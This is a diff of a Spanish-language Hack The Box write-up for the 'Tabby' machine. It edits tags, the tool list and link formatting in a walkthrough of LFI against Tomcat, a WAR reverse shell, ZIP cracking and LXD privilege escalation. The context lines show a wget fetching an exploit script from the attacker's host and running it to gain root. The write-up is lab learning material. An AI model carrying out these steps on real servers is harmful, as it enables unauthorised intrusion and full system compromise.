@@ -20,7 +20,7 @@ tags:
   - Deploying Authenticated Code Execution Malicious WAR
   - Reverse Shell
   - Cracking ZIP
-  - LXD/LXC Exploitation
+  - Privesc - LXD/LXC Exploitation
   - OSCP Style
   - Metasploit Framework
 ---
@@ -29,6 +29,7 @@ tags:
 Esta fue una máquina algo complicada, descubrimos que usa el servicio **Tomcat** para su página web y aplicamos **Local File Inclusion (LFI)** para poder enumerar distintos archivos como el **/etc/passwd** y logramos ver el **tomcat-users.xml** que tiene usuario y contraseña de un usuario de ese servicio. Utilizamos **curl** para subir una aplicación web tipo **.WAR** que contiene una **Reverse Shell**, dentro de la máquina copiamos en **base64** un archivo **.ZIP** con el cual obtenemos la contraseña de un usuario. Por último, usamos el grupo **LXD** al que esta asignado un usuario para escalar privilegios usando un Exploit.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *whatweb*
@@ -37,7 +38,8 @@ Herramientas utilizadas:
 * *curl*
 * *msfvenom*
 * *nc*
-* *metasploit framework*
+* *metasploit framework(msfconsole)*
+* *Módulo: exploit/multi/http/tomcat_mgr_deploy*
 * *base64*
 * *sponge*
 * *unzip*
@@ -385,7 +387,7 @@ Tampoco, entonces me da a entender que se movió este archivo hacia otro lado.
 Busquemos por internet posibles rutas para este archivo.
 
 Encontré algunas rutas que podemos probar:
-* https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory
+* <a href="https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory" target="_blank">What is the Tomcat installation directory?</a>
 
 Podemos probar varias, pero la que nos servirá será la siguiente: **/usr/share/tomcat9/etc/tomcat-users.xml**:
 
@@ -413,11 +415,11 @@ Vamos a probarlo:
 <img src="/assets/images/htb-writeup-tabby/Captura14.png">
 </p>
 
-Aca te dejo un blog sobre tomcat 9:
-* https://tomcat.apache.org/tomcat-9.0-doc/html-host-manager-howto.html
+Aca te dejo un blog sobre **tomcat 9**:
+* <a href="https://tomcat.apache.org/tomcat-9.0-doc/html-host-manager-howto.html" target="_blank">Apache Tomcat 9</a>
 
 Veamos el siguiente blog de **HackTricks**:
-* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
+* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat" target="_blank">HackTricks: Tomcat</a>
 
 Ve que nos dice que existe otro login siendo el **manager_webapp** (que es el mismo que encontramos en la **máquina Jerry**) y justamente es el mismo que nos indica el **puerto 8080** que no podremos entrar a menos que tengamos el rol **"manager-gui"**.
 
@@ -867,7 +869,7 @@ function createContainer(){
 ```bash
 ash@tabby:/tmp$ wget http://Tu_IP/Lxd_Exploit.sh
 --2023-05-12 23:04:57--  http://Tu_IP/Lxd_Exploit.sh
-Connecting to 10.10.14.4:80... connected.
+Connecting to Tu_IP:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 1434 (1.4K) [text/x-sh]
 Saving to: ‘Lxd_Exploit.sh’
@@ -902,7 +904,6 @@ ash@tabby:/dev/shm$ export PATH=/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/lo
 ash@tabby:/dev/shm$ ./Lxd_Exploit.sh -f alpine-v3.18-x86_64-20230512_1700.tar.gz 
 If this is your first time running LXD on this machine, you should also run: lxd init
 To start your first instance, try: lxc launch ubuntu:18.04
-Image imported with fingerprint: 8dce54570880176a4f116a60e0876a32853f9c2dfba9043d1a633a93f365dd77
 [*] Listing images...
 Creating privesc
 Device giveMeRoot added to privesc         
@@ -935,6 +936,7 @@ Y por fin, terminamos esta máquina.
 	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
+
 * http://www.jtech.ua.es/j2ee/2003-2004/modulos/srv/sesion03-apuntes.htm
 * https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
@@ -946,6 +948,7 @@ Y por fin, terminamos esta máquina.
 * https://dit.gonzalonazareno.org/gestiona/proyectos/2022-23/Introducci%C3%B3n_LXD_MariaJesusBP.pdf
 * https://codingfactsblog.wordpress.com/2020/10/12/escalada-local-de-privilegios-mediante-lxd/
 * https://book.hacktricks.xyz/v/es/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+
 
 <br>
 # FIN
